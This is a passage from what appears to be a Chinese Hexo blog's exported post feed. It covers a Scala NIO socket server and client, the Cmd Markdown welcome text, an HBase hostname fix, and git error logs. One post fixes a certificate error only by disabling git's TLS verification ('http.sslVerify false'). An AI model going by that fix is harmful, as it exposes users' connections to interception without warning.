<span class="keyword">val</span> socketChannel = key.channel().asInstanceOf[<span class="type">SocketChannel</span>]</span><br><span class="line">            <span class="keyword">val</span> bytebuf = <span class="type">ByteBuffer</span>.allocate(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">val</span> read = socketChannel.read(bytebuf)</span><br><span class="line">            read <span class="keyword">match</span> &#123;</span><br><span class="line">              <span class="keyword">case</span> x <span class="keyword">if</span> (x==<span class="number">0</span>) =&gt; println(<span class="string">"server 读取完成"</span>)</span><br><span class="line">              <span class="keyword">case</span> x <span class="keyword">if</span> (x&gt;<span class="number">0</span>) =&gt; &#123;</span><br><span class="line">                println(<span class="string">"server 读取内容"</span>)</span><br><span class="line">                bytebuf.flip()</span><br><span class="line">                <span class="keyword">val</span> byteAry =<span class="keyword">new</span> <span class="type">Array</span>[<span class="type">Byte</span>](bytebuf.remaining())</span><br><span class="line">                <span class="comment">//从缓冲区读取内容</span></span><br><span class="line">                bytebuf.get(byteAry)</span><br><span class="line">                <span class="keyword">val</span> content = <span class="keyword">new</span> <span class="type">String</span>(byteAry,<span class="string">"UTF-8"</span>)</span><br><span class="line">                println(<span class="string">s"server读取到的内容:<span class="subst">$content</span>"</span>)</span><br><span class="line">                <span class="keyword">val</span> readContent = <span class="string">"server读取到内容:"</span>+content</span><br><span class="line">                <span class="keyword">val</span> writeBuf = <span class="type">ByteBuffer</span>.allocate(<span class="number">1024</span>)</span><br><span class="line">                writeBuf.put(readContent.getBytes())</span><br><span class="line">                writeBuf.flip()</span><br><span class="line">                <span class="comment">//向缓冲区写入内容,发送到客户端</span></span><br><span class="line">                socketChannel.write(writeBuf)</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">case</span> x <span class="keyword">if</span> (x&lt;<span class="number">0</span>) =&gt; &#123;</span><br><span class="line">                println(<span class="string">"server 链路关闭"</span>)</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">//可写</span></span><br><span class="line">          <span class="keyword">if</span> (key.isWritable) &#123;</span><br><span class="line">            println(<span class="string">s"可写...."</span>)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">NIOServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> server =<span class="keyword">new</span> <span class="type">NIOServer</span></span><br><span class="line">    server.bind(<span class="string">"localhost"</span>,<span class="number">9090</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Client</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NIOClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@volatile</span> <span class="keyword">var</span> <span class="type">STOP</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">connect</span></span>(host:<span class="type">String</span>,port:<span class="type">Int</span>):<span class="type">Unit</span>=&#123;</span><br><span class="line">     <span class="comment">//初始化多路复用器</span></span><br><span class="line">     <span class="keyword">val</span> selector = <span class="type">Selector</span>.open()</span><br><span class="line">     <span class="keyword">val</span> socketChannel = <span class="type">SocketChannel</span>.open()</span><br><span class="line">     socketChannel.configureBlocking(<span class="literal">false</span>)</span><br><span class="line">     <span class="keyword">val</span> connect = socketChannel.connect(<span class="keyword">new</span> <span class="type">InetSocketAddress</span>(host,port))</span><br><span class="line">     <span class="keyword">if</span> (connect)&#123;</span><br><span class="line">       socketChannel.register(selector,<span class="type">SelectionKey</span>.<span class="type">OP_READ</span>)</span><br><span class="line">       println(<span class="string">s"client 连接情况,<span class="subst">$connect</span>"</span>)</span><br><span class="line">       <span class="comment">//处理写操作</span></span><br><span class="line">       write(socketChannel)</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="comment">//注册连接</span></span><br><span class="line">       socketChannel.register(selector,<span class="type">SelectionKey</span>.<span class="type">OP_CONNECT</span>)</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">while</span> (<span class="type">STOP</span>)&#123;</span><br><span class="line">       selector.select(<span class="number">2000</span>)</span><br><span class="line">       <span class="keyword">val</span> keys = selector.selectedKeys.iterator</span><br><span class="line">       <span class="keyword">while</span> (keys.hasNext)&#123;</span><br><span class="line">          <span class="keyword">val</span> key = keys.next</span><br><span class="line">          keys.remove()</span><br><span class="line">          <span class="keyword">if</span> (key.isValid)&#123;</span><br><span class="line">             <span class="keyword">val</span> socketChannel = key.channel().asInstanceOf[<span class="type">SocketChannel</span>]</span><br><span class="line">             <span class="keyword">if</span> ( key.isConnectable )&#123;</span><br><span class="line">                 println(<span class="string">"连接状态.."</span>)</span><br><span class="line">                 <span class="keyword">if</span> (socketChannel.finishConnect())&#123;</span><br><span class="line">                   socketChannel.register(selector,<span class="type">SelectionKey</span>.<span class="type">OP_READ</span>)</span><br><span class="line">                   <span class="comment">//处理操作</span></span><br><span class="line">                   write(socketChannel)</span><br><span class="line">                 &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="type">System</span>.exit(<span class="number">1</span>)</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (key.isReadable)&#123;</span><br><span class="line">               <span class="keyword">val</span> byteBuf = <span class="type">ByteBuffer</span>.allocate(<span class="number">1024</span>)</span><br><span class="line">               <span class="keyword">val</span> read = socketChannel.read(byteBuf)</span><br><span class="line">               read <span class="keyword">match</span> &#123;</span><br><span class="line">                 <span class="keyword">case</span> x <span class="keyword">if</span> (x==<span class="number">0</span>) =&gt; println(<span class="string">"无可读内容"</span>)</span><br><span class="line">                 <span class="keyword">case</span> x <span class="keyword">if</span> (x&gt;<span class="number">0</span>) =&gt; &#123;</span><br><span class="line">                   println(<span class="string">"可读"</span>)</span><br><span class="line">                   byteBuf.flip()</span><br><span class="line">                   <span class="keyword">val</span> readAry = <span class="keyword">new</span> <span class="type">Array</span>[<span class="type">Byte</span>](byteBuf.remaining())</span><br><span class="line">                   byteBuf.get(readAry)</span><br><span class="line">                   <span class="keyword">val</span> content = <span class="keyword">new</span> <span class="type">String</span>(readAry,<span class="string">"UTF-8"</span>)</span><br><span class="line">                   println(<span class="string">s"client 读取的内容:<span class="subst">$content</span>"</span>)</span><br><span class="line">                   <span class="comment">//读取server内容后退出</span></span><br><span class="line">                   <span class="type">STOP</span> = <span class="literal">false</span></span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">case</span> x <span class="keyword">if</span> (x&lt;<span class="number">0</span>) =&gt; &#123;</span><br><span class="line">                   println(<span class="string">"链路关闭"</span>)</span><br><span class="line">                   key.cancel()</span><br><span class="line">                   socketChannel.close()</span><br><span class="line">                 &#125;</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">write</span></span>(socketChannel:<span class="type">SocketChannel</span>):<span class="type">Unit</span>=&#123;</span><br><span class="line">     <span class="keyword">val</span> content = <span class="string">"socket通信测试内容"</span></span><br><span class="line">     <span class="keyword">val</span> byteBuf = <span class="type">ByteBuffer</span>.allocate(<span class="number">1024</span>)</span><br><span class="line">     byteBuf.put(content.getBytes)</span><br><span class="line">     byteBuf.flip()</span><br><span class="line">     socketChannel.write(byteBuf)</span><br><span class="line">     <span class="keyword">if</span> ( ! byteBuf.hasRemaining )&#123;</span><br><span class="line">         println(<span class="string">s"client内容写入成功:<span class="subst">$content</span>"</span>)</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">NIOClient</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> client =<span class="keyword">new</span> <span class="type">NIOClient</span></span><br><span class="line">    client.connect(<span class="string">"localhost"</span>,<span class="number">9090</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul>
<li>《Unix网络编程》</li>
<li><a href="http://www.jianshu.com/p/486b0965c296" target="_blank" rel="noopener">聊聊Linux 五种IO模型</a></li>
<li><a href="http://blog.chinaunix.net/uid-27105712-id-3270102.html" target="_blank" rel="noopener">漫谈linux文件IO</a></li>
<li><a href="https://en.wikipedia.org/wiki/New_I/O_(Java" target="_blank" rel="noopener">New I/O java </a> )</li>
<li><a href="https://en.wikipedia.org/wiki/Asynchronous_I/O" target="_blank" rel="noopener">Asynchronous_I/O</a></li>
<li><a href="http://www.importnew.com/19816.html" target="_blank" rel="noopener">攻破JAVA NIO技术壁垒</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>netty</tag>
      </tags>
  </entry>
  <entry>
    <title>Cmd Markdown 编辑阅读器</title>
    <url>/2017/10/23/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Cmd%20Markdown%20%E7%BC%96%E8%BE%91%E9%98%85%E8%AF%BB%E5%99%A8/</url>
    <content><![CDATA[<p>我们理解您需要更便捷更高效的工具记录思想，整理笔记、知识，并将其中承载的价值传播给他人，<strong>Cmd Markdown</strong> 是我们给出的答案 —— 我们为记录思想和分享知识提供更专业的工具。 您可以使用 Cmd Markdown：</p>
<blockquote>
<ul>
<li>整理知识，学习笔记</li>
<li>发布日记，杂文，所见所想</li>
<li>撰写发布技术文稿（代码支持）</li>
<li>撰写发布学术论文（LaTeX 公式支持）</li>
</ul>
</blockquote>
<p><img src="https://www.zybuluo.com/static/img/logo.png" alt="cmd-markdown-logo"></p>
<p>除了您现在看到的这个 Cmd Markdown 在线版本，您还可以前往以下网址下载：</p>
<h3 id="Windows-Mac-Linux-全平台客户端"><a href="#Windows-Mac-Linux-全平台客户端" class="headerlink" title="Windows/Mac/Linux 全平台客户端"></a><a href="https://www.zybuluo.com/cmd/" target="_blank" rel="noopener">Windows/Mac/Linux 全平台客户端</a></h3><blockquote>
<p>请保留此份 Cmd Markdown 的欢迎稿兼使用说明，如需撰写新稿件，点击顶部工具栏右侧的 <i class="icon-file"></i> <strong>新文稿</strong> 或者使用快捷键 <code>Ctrl+Alt+N</code>。</p>
</blockquote>
<hr>
<h2 id="什么是-Markdown"><a href="#什么是-Markdown" class="headerlink" title="什么是 Markdown"></a>什么是 Markdown</h2><p>Markdown 是一种方便记忆、书写的纯文本标记语言，用户可以使用这些标记符号以最小的输入代价生成极富表现力的文档：譬如您正在阅读的这份文档。它使用简单的符号标记不同的标题，分割不同的段落，<strong>粗体</strong> 或者 <em>斜体</em> 某些文字，更棒的是，它还可以</p>
<h3 id="1-制作一份待办事宜-Todo-列表"><a href="#1-制作一份待办事宜-Todo-列表" class="headerlink" title="1. 制作一份待办事宜 Todo 列表"></a>1. 制作一份待办事宜 <a href="https://www.zybuluo.com/mdeditor?url=https://www.zybuluo.com/static/editor/md-help.markdown#13-待办事宜-todo-列表" target="_blank" rel="noopener">Todo 列表</a></h3><ul>
<li>[ ] 支持以 PDF 格式导出文稿</li>
<li>[ ] 改进 Cmd 渲染算法，使用局部渲染技术提高渲染效率</li>
<li>[x] 新增 Todo 列表功能</li>
<li>[x] 修复 LaTex 公式渲染问题</li>
<li>[x] 新增 LaTex 公式编号功能</li>
</ul>
<h3 id="2-书写一个质能守恒公式LaTeX"><a href="#2-书写一个质能守恒公式LaTeX" class="headerlink" title="2. 书写一个质能守恒公式LaTeX"></a>2. 书写一个质能守恒公式<sup><a href="#fn_LaTeX" id="reffn_LaTeX">LaTeX</a></sup></h3><script type="math/tex; mode=display">E=mc^2</script><h3 id="3-高亮一段代码code"><a href="#3-高亮一段代码code" class="headerlink" title="3. 高亮一段代码code"></a>3. 高亮一段代码<sup><a href="#fn_code" id="reffn_code">code</a></sup></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@requires_authorization</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SomeClass</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># A comment</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'hello world'</span></span><br></pre></td></tr></table></figure>
<h3 id="4-高效绘制-流程图"><a href="#4-高效绘制-流程图" class="headerlink" title="4. 高效绘制 流程图"></a>4. 高效绘制 <a href="https://www.zybuluo.com/mdeditor?url=https://www.zybuluo.com/static/editor/md-help.markdown#7-流程图" target="_blank" rel="noopener">流程图</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">st=&gt;start: Start</span><br><span class="line">op=&gt;operation: Your Operation</span><br><span class="line">cond=&gt;condition: Yes or No?</span><br><span class="line">e=&gt;end</span><br><span class="line"></span><br><span class="line">st-&gt;op-&gt;cond</span><br><span class="line">cond(yes)-&gt;e</span><br><span class="line">cond(no)-&gt;op</span><br></pre></td></tr></table></figure>
<h3 id="5-高效绘制-序列图"><a href="#5-高效绘制-序列图" class="headerlink" title="5. 高效绘制 序列图"></a>5. 高效绘制 <a href="https://www.zybuluo.com/mdeditor?url=https://www.zybuluo.com/static/editor/md-help.markdown#8-序列图" target="_blank" rel="noopener">序列图</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Alice-&gt;Bob: Hello Bob, how are you?</span><br><span class="line">Note right of Bob: Bob thinks</span><br><span class="line">Bob--&gt;Alice: I am good thanks!</span><br></pre></td></tr></table></figure>
<h3 id="6-高效绘制-甘特图"><a href="#6-高效绘制-甘特图" class="headerlink" title="6. 高效绘制 甘特图"></a>6. 高效绘制 <a href="https://www.zybuluo.com/mdeditor?url=https://www.zybuluo.com/static/editor/md-help.markdown#9-甘特图" target="_blank" rel="noopener">甘特图</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">title 项目开发流程</span><br><span class="line">section 项目确定</span><br><span class="line">    需求分析       :a1, 2016-06-22, 3d</span><br><span class="line">    可行性报告     :after a1, 5d</span><br><span class="line">    概念验证       : 5d</span><br><span class="line">section 项目实施</span><br><span class="line">    概要设计      :2016-07-05  , 5d</span><br><span class="line">    详细设计      :2016-07-08, 10d</span><br><span class="line">    编码          :2016-07-15, 10d</span><br><span class="line">    测试          :2016-07-22, 5d</span><br><span class="line">section 发布验收</span><br><span class="line">    发布: 2d</span><br><span class="line">    验收: 3d</span><br></pre></td></tr></table></figure>
<h3 id="7-绘制表格"><a href="#7-绘制表格" class="headerlink" title="7. 绘制表格"></a>7. 绘制表格</h3><div class="table-container">
<table>
<thead>
<tr>
<th>项目</th>
<th style="text-align:right">价格</th>
<th style="text-align:center">数量</th>
</tr>
</thead>
<tbody>
<tr>
<td>计算机</td>
<td style="text-align:right">$1600</td>
<td style="text-align:center">5</td>
</tr>
<tr>
<td>手机</td>
<td style="text-align:right">$12</td>
<td style="text-align:center">12</td>
</tr>
<tr>
<td>管线</td>
<td style="text-align:right">$1</td>
<td style="text-align:center">234</td>
</tr>
</tbody>
</table>
</div>
<h3 id="8-更详细语法说明"><a href="#8-更详细语法说明" class="headerlink" title="8. 更详细语法说明"></a>8. 更详细语法说明</h3><p>想要查看更详细的语法说明，可以参考我们准备的 <a href="https://www.zybuluo.com/mdeditor?url=https://www.zybuluo.com/static/editor/md-help.markdown" target="_blank" rel="noopener">Cmd Markdown 简明语法手册</a>，进阶用户可以参考 <a href="https://www.zybuluo.com/mdeditor?url=https://www.zybuluo.com/static/editor/md-help.markdown#cmd-markdown-高阶语法手册" target="_blank" rel="noopener">Cmd Markdown 高阶语法手册</a> 了解更多高级功能。</p>
<p>总而言之，不同于其它 <em>所见即所得</em> 的编辑器：你只需使用键盘专注于书写文本内容，就可以生成印刷级的排版格式，省却在键盘和工具栏之间来回切换，调整内容和格式的麻烦。<strong>Markdown 在流畅的书写和印刷级的阅读体验之间找到了平衡。</strong> 目前它已经成为世界上最大的技术分享网站 GitHub 和 技术问答网站 StackOverFlow 的御用书写格式。</p>
<hr>
<h2 id="什么是-Cmd-Markdown"><a href="#什么是-Cmd-Markdown" class="headerlink" title="什么是 Cmd Markdown"></a>什么是 Cmd Markdown</h2><p>您可以使用很多工具书写 Markdown，但是 Cmd Markdown 是这个星球上我们已知的、最好的 Markdown 工具——没有之一 ：）因为深信文字的力量，所以我们和你一样，对流畅书写，分享思想和知识，以及阅读体验有极致的追求，我们把对于这些诉求的回应整合在 Cmd Markdown，并且一次，两次，三次，乃至无数次地提升这个工具的体验，最终将它演化成一个 <strong>编辑/发布/阅读</strong> Markdown 的在线平台——您可以在任何地方，任何系统/设备上管理这里的文字。</p>
<h3 id="1-实时同步预览"><a href="#1-实时同步预览" class="headerlink" title="1. 实时同步预览"></a>1. 实时同步预览</h3><p>我们将 Cmd Markdown 的主界面一分为二，左边为<strong>编辑区</strong>，右边为<strong>预览区</strong>，在编辑区的操作会实时地渲染到预览区方便查看最终的版面效果，并且如果你在其中一个区拖动滚动条，我们有一个巧妙的算法把另一个区的滚动条同步到等价的位置，超酷！</p>
<h3 id="2-编辑工具栏"><a href="#2-编辑工具栏" class="headerlink" title="2. 编辑工具栏"></a>2. 编辑工具栏</h3><p>也许您还是一个 Markdown 语法的新手，在您完全熟悉它之前，我们在 <strong>编辑区</strong> 的顶部放置了一个如下图所示的工具栏，您可以使用鼠标在工具栏上调整格式，不过我们仍旧鼓励你使用键盘标记格式，提高书写的流畅度。</p>
<p><img src="https://www.zybuluo.com/static/img/toolbar-editor.png" alt="tool-editor"></p>
<h3 id="3-编辑模式"><a href="#3-编辑模式" class="headerlink" title="3. 编辑模式"></a>3. 编辑模式</h3><p>完全心无旁骛的方式编辑文字：点击 <strong>编辑工具栏</strong> 最右侧的拉伸按钮或者按下 <code>Ctrl + M</code>，将 Cmd Markdown 切换到独立的编辑模式，这是一个极度简洁的写作环境，所有可能会引起分心的元素都已经被挪除，超清爽！</p>
<h3 id="4-实时的云端文稿"><a href="#4-实时的云端文稿" class="headerlink" title="4. 实时的云端文稿"></a>4. 实时的云端文稿</h3><p>为了保障数据安全，Cmd Markdown 会将您每一次击键的内容保存至云端，同时在 <strong>编辑工具栏</strong> 的最右侧提示 <code>已保存</code> 的字样。无需担心浏览器崩溃，机器掉电或者地震，海啸——在编辑的过程中随时关闭浏览器或者机器，下一次回到 Cmd Markdown 的时候继续写作。</p>
<h3 id="5-离线模式"><a href="#5-离线模式" class="headerlink" title="5. 离线模式"></a>5. 离线模式</h3><p>在网络环境不稳定的情况下记录文字一样很安全！在您写作的时候，如果电脑突然失去网络连接，Cmd Markdown 会智能切换至离线模式，将您后续键入的文字保存在本地，直到网络恢复再将他们传送至云端，即使在网络恢复前关闭浏览器或者电脑，一样没有问题，等到下次开启 Cmd Markdown 的时候，她会提醒您将离线保存的文字传送至云端。简而言之，我们尽最大的努力保障您文字的安全。</p>
<h3 id="6-管理工具栏"><a href="#6-管理工具栏" class="headerlink" title="6. 管理工具栏"></a>6. 管理工具栏</h3><p>为了便于管理您的文稿，在 <strong>预览区</strong> 的顶部放置了如下所示的 <strong>管理工具栏</strong>：</p>
<p><img src="https://www.zybuluo.com/static/img/toolbar-manager.jpg" alt="tool-manager"></p>
<p>通过管理工具栏可以：</p>
<p><i class="icon-share">&lt;/i&gt; 发布：将当前的文稿生成固定链接，在网络上发布，分享<br><i class="icon-file"></i> 新建：开始撰写一篇新的文稿<br><i class="icon-trash">&lt;/i&gt; 删除：删除当前的文稿<br><i class="icon-cloud"></i> 导出：将当前的文稿转化为 Markdown 文本或者 Html 格式，并导出到本地<br><i class="icon-reorder">&lt;/i&gt; 列表：所有新增和过往的文稿都可以在这里查看、操作<br><i class="icon-pencil"></i> 模式：切换 普通/Vim/Emacs 编辑模式</i></i></i></p>
<h3 id="7-阅读工具栏"><a href="#7-阅读工具栏" class="headerlink" title="7. 阅读工具栏"></a>7. 阅读工具栏</h3><p><img src="https://www.zybuluo.com/static/img/toolbar-reader.jpg" alt="tool-manager"></p>
<p>通过 <strong>预览区</strong> 右上角的 <strong>阅读工具栏</strong>，可以查看当前文稿的目录并增强阅读体验。</p>
<p>工具栏上的五个图标依次为：</p>
<p><i class="icon-list">&lt;/i&gt; 目录：快速导航当前文稿的目录结构以跳转到感兴趣的段落<br><i class="icon-chevron-sign-left"></i> 视图：互换左边编辑区和右边预览区的位置<br><i class="icon-adjust">&lt;/i&gt; 主题：内置了黑白两种模式的主题，试试 <strong>黑色主题</strong>，超炫！<br><i class="icon-desktop"></i> 阅读：心无旁骛的阅读模式提供超一流的阅读体验<br><i class="icon-fullscreen"></i> 全屏：简洁，简洁，再简洁，一个完全沉浸式的写作和阅读环境</i></i></p>
<h3 id="8-阅读模式"><a href="#8-阅读模式" class="headerlink" title="8. 阅读模式"></a>8. 阅读模式</h3><p>在 <strong>阅读工具栏</strong> 点击 <i class="icon-desktop"></i> 或者按下 <code>Ctrl+Alt+M</code> 随即进入独立的阅读模式界面，我们在版面渲染上的每一个细节：字体，字号，行间距，前背景色都倾注了大量的时间，努力提升阅读的体验和品质。</p>
<h3 id="9-标签、分类和搜索"><a href="#9-标签、分类和搜索" class="headerlink" title="9. 标签、分类和搜索"></a>9. 标签、分类和搜索</h3><p>在编辑区任意行首位置输入以下格式的文字可以标签当前文档：</p>
<p>标签： 未分类</p>
<p>标签以后的文稿在【文件列表】（Ctrl+Alt+F）里会按照标签分类，用户可以同时使用键盘或者鼠标浏览查看，或者在【文件列表】的搜索文本框内搜索标题关键字过滤文稿，如下图所示：</p>
<p><img src="https://www.zybuluo.com/static/img/file-list.png" alt="file-list"></p>
<h3 id="10-文稿发布和分享"><a href="#10-文稿发布和分享" class="headerlink" title="10. 文稿发布和分享"></a>10. 文稿发布和分享</h3><p>在您使用 Cmd Markdown 记录，创作，整理，阅读文稿的同时，我们不仅希望它是一个有力的工具，更希望您的思想和知识通过这个平台，连同优质的阅读体验，将他们分享给有相同志趣的人，进而鼓励更多的人来到这里记录分享他们的思想和知识，尝试点击 <i class="icon-share"></i> (Ctrl+Alt+P) 发布这份文档给好友吧！</p>
<hr>
<p>再一次感谢您花费时间阅读这份欢迎稿，点击 <i class="icon-file"></i> (Ctrl+Alt+N) 开始撰写新的文稿吧！祝您在这里记录、阅读、分享愉快！</p>
<p>作者 <a href="http://weibo.com/ghosert" target="_blank" rel="noopener">@ghosert</a><br>2016 年 07月 07日    </p>
<blockquote id="fn_LaTeX">
<sup>LaTeX</sup>. 支持 <strong>LaTeX</strong> 编辑显示支持，例如：$\sum_{i=1}^n a_i=0$， 访问 <a href="http://meta.math.stackexchange.com/questions/5020/mathjax-basic-tutorial-and-quick-reference" target="_blank" rel="noopener">MathJax</a> 参考更多使用方法。<a href="#reffn_LaTeX" title="Jump back to footnote [LaTeX] in the text."> &#8617;</a>
</blockquote>
<blockquote id="fn_code">
<sup>code</sup>. 代码高亮功能支持包括 Java, Python, JavaScript 在内的，<strong>四十一</strong>种主流编程语言。<a href="#reffn_code" title="Jump back to footnote [code] in the text."> &#8617;</a>
</blockquote>
]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>SSL certificate problem：unable to get local issuer certificate</title>
    <url>/2018/06/01/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/SSL%20certificate%20problem/</url>
    <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\workspace\IDEA&gt; git pull</span><br><span class="line">fatal: unable to access <span class="string">'https://github.com/XXXX'</span>: SSL certificate problem: u</span><br><span class="line">nable to get <span class="built_in">local</span> issuer certificate</span><br><span class="line"></span><br><span class="line">D:\workspace\IDEA&gt; git config http.sslVerify <span class="literal">false</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>failed Connection refused localhost127.0.0.1:16000</title>
    <url>/2019/04/11/%E5%A4%A7%E6%95%B0%E6%8D%AE/failed%20Connection%20refused%20localhost127.0.0.116000/</url>
    <content><![CDATA[<p>hbase regionserver 启动失败,查看日志</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Caused by: org.apache.hbase.thirdparty.io.netty.channel.AbstractChannel<span class="variable">$AnnotatedConnectException</span>: syscall:getsockopt(..) failed: Connection refused: localhost/127.0.0.1:16000</span><br><span class="line">        at org.apache.hbase.thirdparty.io.netty.channel.unix.Socket.finishConnect(..)(Unknown Source)</span><br><span class="line">Caused by: org.apache.hbase.thirdparty.io.netty.channel.unix.Errors<span class="variable">$NativeConnectException</span>: syscall:getsockopt(..) failed: Connection refused</span><br></pre></td></tr></table></figure>
<p>16000 端口拒绝连接。hbase shell 中 dead server 为 3.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hbase(main):003:0&gt; status</span><br><span class="line">1 active master, 0 backup masters, 0 servers, 3 dead, 0.3333 average load</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>16000 是 master 的默认端口。和 master 通信失败。但是 zookeeper 中/hbase/master 节点的数据显示 localhost。把 master 对应的 hostname 修改为 hadoop01,并且配置 hosts,删除 localhost 的配置信息,将 ip 和 hostname 映射信息配置 ok。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@hadoop04 logs]# cat /etc/hosts</span><br><span class="line">192.168.19.130 hadoop01</span><br><span class="line">192.168.19.131 hadoop02</span><br><span class="line">192.168.19.132 hadoop03</span><br><span class="line">192.168.19.133 hadoop04</span><br><span class="line">192.168.19.134 hadoop05</span><br></pre></td></tr></table></figure>
<p>重启集群即可。<br>此时 regionserver 已经正常启动且和 master 通信成功。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hbase(main):003:0&gt; status</span><br><span class="line">1 active master, 1 backup masters, 3 servers, 0 dead, 0.3333 average load</span><br></pre></td></tr></table></figure>
<p>此时,hbase 服务显示正常。</p>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>hbase</tag>
      </tags>
  </entry>
  <entry>
    <title>git push rejected</title>
    <url>/2018/05/19/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/git%20push%20rejected/</url>
    <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\workspace\CLion\C&gt; git push --<span class="built_in">set</span>-upstream origin master</span><br><span class="line">fatal: HttpRequestException encountered.</span><br><span class="line">   发送请求时出错。</span><br><span class="line">Username <span class="keyword">for</span> <span class="string">'https://github.com'</span>: </span><br><span class="line">Password <span class="keyword">for</span> <span class="string">''</span>:</span><br><span class="line">To https://github.com/C.git</span><br><span class="line"> ! [rejected]        master -&gt; master (fetch first)</span><br><span class="line">error: failed to push some refs to <span class="string">'https://github.com/C.git'</span></span><br><span class="line">hint: Updates were rejected because the remote contains work that you <span class="keyword">do</span></span><br><span class="line">hint: not have locally. This is usually caused by another repository pushing</span><br><span class="line">hint: to the same ref. You may want to first integrate the remote changes</span><br><span class="line">hint: (e.g., <span class="string">'git pull ...'</span>) before pushing again.</span><br><span class="line">hint: See the <span class="string">'Note about fast-forwards'</span> <span class="keyword">in</span> <span class="string">'git push --help'</span> <span class="keyword">for</span> details.</span><br><span class="line"></span><br><span class="line">D:\workspace\CLion\C&gt;git pull</span><br><span class="line">warning: no common commits</span><br><span class="line">remote: Counting objects: 3, <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (2/2), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0</span><br><span class="line">Unpacking objects: 100% (3/3), <span class="keyword">done</span>.</span><br><span class="line">From https://github.com/C</span><br><span class="line"> * [new branch]      master     -&gt; origin/master</span><br><span class="line">There is no tracking information <span class="keyword">for</span> the current branch.</span><br><span class="line">Please specify <span class="built_in">which</span> branch you want to merge with.</span><br><span class="line">See git-pull(1) <span class="keyword">for</span> details.</span><br><span class="line"></span><br><span class="line">    git pull &lt;remote&gt; &lt;branch&gt;</span><br><span class="line"></span><br><span class="line">If you wish to <span class="built_in">set</span> tracking information <span class="keyword">for</span> this branch you can <span class="keyword">do</span> so with:</span><br><span class="line"></span><br><span class="line">    git branch --<span class="built_in">set</span>-upstream-to=origin/&lt;branch&gt; master</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">D:\workspace\CLion\C&gt;git branch --<span class="built_in">set</span>-upstream-to=origin/master master</span><br><span class="line">Branch <span class="string">'master'</span> <span class="built_in">set</span> up to track remote branch <span class="string">'master'</span> from <span class="string">'origin'</span>.</span><br><span class="line"></span><br><span class="line">D:\workspace\CLion\C&gt;git push</span><br><span class="line">fatal: HttpRequestException encountered.</span><br><span class="line">   发送请求时出错。</span><br><span class="line">Username <span class="keyword">for</span> <span class="string">'https://github.com'</span>: </span><br><span class="line">Password <span 